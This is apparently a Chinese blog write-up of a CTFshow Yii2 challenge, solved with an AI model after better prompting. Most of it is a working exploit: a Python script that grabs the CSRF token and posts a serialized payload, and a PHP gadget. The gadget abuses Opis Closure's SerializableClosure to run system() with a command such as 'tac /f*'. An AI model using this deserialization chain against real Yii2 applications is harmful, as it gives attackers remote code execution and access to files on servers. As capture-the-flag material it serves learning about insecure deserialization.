---
title: Ctfshow Yii
slug: ctfshow-yii
description:
date: 2026-06-18T16:32:10+08:00
lastmod: 2026-06-18T16:32:10+08:00
categories:
  - ctfshow
tags:
  - yii2
---
## TL;DR

https://mp.weixin.qq.com/s/XIOvq9PDWfKw9QLYpkGAHg 前几天我看到这一篇文章，这令我想到在之前参加 CTF 的时候，大家都有 AI 来做题，但是为什么有些人他就是快，即使他的提示词是“给我 flag”，大概理解了文章的优化思路之后，我们可以和 AI 合作去写提示词

```
我需要你帮我写一个提示词。请注意：不要在提示词里规定具体的实现步骤或技术方案，只描述清楚目标、背景和约束。假设执行这个提示词的 AI 有很强的自主能力，让它自己决定怎么做。我的需求是：xxx
```

毕竟如果是人的话，不一定每次的提示词都写的那么标准
在我失去 codex 的力量之后，我常常粗略的阅读 AI 类文章，以达到了解提效思路，但是效果都不是那么的直观，还是被模型基底能力所控制，但是这次知识分享让我实际感受到了差距，因为在此之前我不少挑战过这个 CTFshow 系列，但是最终都没有完全解出，可能是网上没有参考答案的原因，这使我愈发的想要完成提交 flag 的壮举🥴

## wp

使用模型 GPT5.4 xhigh 
由于是 yii2 所以还需要自动获得 csrf token 才能发包

```python
#!/usr/bin/env python3
import re
import subprocess
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://c0162865-9f2e-4206-ae78-a891d86c2b71.challenge.ctf.show/index.php?r=site%2Funserialize"
COMMAND = "tac /f*"
POP = Path(__file__).with_name("pop.php")


def build_payload() -> str:
    return subprocess.check_output(
        ["php", "-d", "error_reporting=0", "-d", "display_errors=0", str(POP), COMMAND],
        text=True,
    ).strip()


def fetch_flag() -> str:
    session = requests.Session()
    
    form = session.get(TARGET, verify=False, timeout=15)
    form.raise_for_status()

    m = re.search(r'name="_csrf" value="([^"]+)"', form.text)
    if not m:
        raise RuntimeError("csrf token not found")

    payload = build_payload()
    resp = session.post(
        TARGET,
        data={
            "_csrf": m.group(1),
            "UnserializeForm[ctfshowUnserializeData]": payload,
        },
        verify=False,
        timeout=15,
    )
    resp.raise_for_status()

    flag = re.search(r"ctfshow\{[^}]+\}", resp.text)
    if flag:
        return flag.group(0)

    return resp.text.split("<!DOCTYPE html>", 1)[0].strip()


if __name__ == "__main__":
    print(fetch_flag())

```

https://github.com/yiisoft/yii2/releases?page=2#release-2.0.43 从这里拿到源码，我们只需要挖到四条不同的 pop_chain 即可，但是我好像非预期了，这条链子四道题都可以用

![](assets/001.png)

```php
<?php

declare(strict_types=1);

namespace Opis\Closure {
    final class SerializableClosure implements \Serializable
    {
        private string $function;
        private ?string $scope = null;
        private $thisObject = null;
        private string $self = 'x';

        public function __construct(string $cmd = 'cat /flags_c')
        {
            $this->function = sprintf(
                '(function(){system(%s); return function(){};})()',
                var_export($cmd, true)
            );
        }

        public function serialize(): string
        {
            return serialize([
                'use' => [],
                'function' => $this->function,
                'scope' => $this->scope,
                'this' => $this->thisObject,
                'self' => $this->self,
            ]);
        }

        public function unserialize($data): void
        {
        }
    }
}

namespace {
    error_reporting(E_ERROR);
    ini_set('display_errors', '0');

    $a = new \Opis\Closure\SerializableClosure($argv[1] ?? 'tac /f*');
    echo serialize($a);
}

```

好了，那么现在网上也有这个专题的 WP 了 

![](assets/002.png)